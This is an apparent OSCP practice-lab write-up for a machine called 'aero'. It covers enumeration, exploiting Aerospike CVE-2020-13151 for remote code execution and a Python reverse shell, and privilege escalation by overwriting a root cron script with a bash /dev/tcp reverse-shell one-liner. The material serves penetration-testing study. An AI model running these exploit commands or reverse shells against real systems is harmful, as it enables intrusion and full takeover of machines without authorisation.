##### Tags: `sqli`  `sudo-l`  `webenum`  `GTFOBin`

# 🐧OSCP-A (aero)🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.158.143                                                                

PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
81/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
443/tcp  open  http       Apache httpd 2.4.41
3000/tcp open  ppp?
3001/tcp open  nessus?
3003/tcp open  cgms?
3306/tcp open  mysql      MySQL (unauthorized)
5432/tcp open  postgresql PostgreSQL DB 12.9 - 12.13
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3003-TCP:V=7.95%I=7%D=6/13%Time=6A2CE967%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,1,"\n")%r(GetRequest,1,"\n")%r(HTTPOptions,1,"\n")%r(RTSPReq
SF:uest,1,"\n")%r(Help,1,"\n")%r(SSLSessionReq,1,"\n")%r(TerminalServerCoo
SF:kie,1,"\n")%r(Kerberos,1,"\n")%r(FourOhFourRequest,1,"\n")%r(LPDString,
SF:1,"\n")%r(LDAPSearchReq,1,"\n")%r(SIPOptions,1,"\n");
Service Info: Host: 127.0.0.2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
````
port 21 ftp doesn't allow anonymous login  
port 80, 81, 443 is web service, didn't find anything after digging into it  
port 3306, 5432 mysql and postgresql unable to login externally  
```console
$ mysql -u root -p -h 192.168.158.143 --skip-ssl-verify-server-cert  
Enter password: 
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.184' is not allowed to connect to this MySQL server
                                                                                                                                    
$ psql -h 192.168.158.143 -U postgres 
psql: error: connection to server at "192.168.158.143", port 5432 failed: FATAL:  no pg_hba.conf entry for host "192.168.45.184", user "postgres", database "postgres", SSL on
connection to server at "192.168.158.143", port 5432 failed: FATAL:  no pg_hba.conf entry for host "192.168.45.184", user "postgres", database "postgres", SSL off
```
port 3003 looks connectable from the nmap scan  
found the service name and version number
```console
$ nc -nv 192.168.158.143 3003 
(UNKNOWN) [192.168.158.143] 3003 (?) open

help
bins;build;build_os;build_time;cluster-name;config-get;config-set;digests;dump-cluster;dump-fabric;dump-hb;dump-hlc;dump-migrates;dump-msgs;dump-rw;dump-si;dump-skew;dump-wb-summary;eviction-reset;feature-key;get-config;get-sl;health-outliers;health-stats;histogram;jem-stats;jobs;latencies;log;log-set;log-message;logs;mcast;mesh;name;namespace;namespaces;node;physical-devices;quiesce;quiesce-undo;racks;recluster;revive;roster;roster-set;service;services;services-alumni;services-alumni-reset;set-config;set-log;sets;show-devices;sindex;sindex-create;sindex-delete;sindex-histogram;statistics;status;tip;tip-clear;truncate;truncate-namespace;truncate-namespace-undo;truncate-undo;version;

version
Aerospike Community Edition build 5.1.0.1
```
search google and found this version is vulnerable CVE-2020-13151
console
```
https://github.com/b4ny4n/CVE-2020-13151
```
run the script and confirmed we have RCE
```console
$ python3 cve2020-13151.py --ahost 192.168.158.143 --aport 3000 --cmd 'id'
[+] aerospike build info: 5.1.0.1

[+] looks vulnerable
[+] populating dummy table.
[+] writing to test.cve202013151
[+] wrote ShIXqcOMYzUDbwCq
[+] registering udf
[+] issuing command "id"
uid=1000(aero) gid=1000(aero) groups=1000(aero)
```
get the reverse shell
```console
$ python3 cve2020-13151.py --ahost 192.168.158.143 --aport 3000 --pythonshell --lhost=192.168.45.184 --lport=443 
[+] aerospike build info: 5.1.0.1

[+] looks vulnerable
[+] populating dummy table.
[+] writing to test.cve202013151
[+] wrote vcSlySTpwFrtzEdX
[+] registering udf
[+] sending payload, make sure you have a listener on 192.168.45.184:443.....
```
```console
$ penelope -p 443 
[+] Listening for reverse shells on 0.0.0.0:443 →  127.0.0.1 • 10.0.2.15 • 172.17.0.1 • 192.168.45.184
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from oscp 192.168.158.143 Linux-x86_64 👤 aero(1000) • Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3
[+] Interacting with session [1] • Shell Type PTY • Menu key F12 ⇐
[+] Logging to /home/ming/.penelope/sessions/oscp~192.168.158.143-Linux-x86_64/2026_06_13-16_23_35-025.log
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
aero@oscp:/$ id
uid=1000(aero) gid=1000(aero) groups=1000(aero)
```
## Privilege Escalation
upload pspy and found there is a cron job running by root every minute
```console
aero@oscp:/home/aero$ ./pspy32s
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

2026/06/13 06:53:01 CMD: UID=0     PID=63041  | python /bin/asinfo -v STATUS
```
we have write permission on this file
```console
aero@oscp:/home/aero$ ls -la /bin/asinfo
lrwxrwxrwx 1 root root 25 Dec  7  2019 /bin/asinfo -> /opt/aerospike/bin/asinfo

aero@oscp:/home/aero$ ls -la /opt/aerospike/bin/asinfo
-rwxr-xr-x 1 aero aero 43 Jun 13 07:12 /opt/aerospike/bin/asinfo
```
update the script with our reverse shell payload
```console
aero@oscp:/home/aero$ echo 'bash -i >& /dev/tcp/192.168.45.184/80 0>&1' > /opt/aerospike/bin/asinfo

aero@oscp:/home/aero$ cat /opt/aerospike/bin/asinfo
bash -i >& /dev/tcp/192.168.45.184/80 0>&1
```
after 1 minutes and we got the root shell
```console
$ penelope -p 80           
[+] Listening for reverse shells on 0.0.0.0:80 →  127.0.0.1 • 10.0.2.15 • 172.17.0.1 • 192.168.45.184
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[-] Invalid shell from 192.168.158.143 🙄
[+] Got reverse shell from oscp 192.168.158.143 Linux-x86_64 👤 root(0) • Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3
[+] Interacting with session [1] • Shell Type PTY • Menu key F12 ⇐
[+] Logging to /home/ming/.penelope/sessions/oscp~192.168.158.143-Linux-x86_64/2026_06_13-17_12_47-916.log
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] Got reverse shell from oscp 192.168.158.143 Linux-x86_64 👤 root(0) • Assigned SessionID <2>
root@oscp:/# whoami
root
```
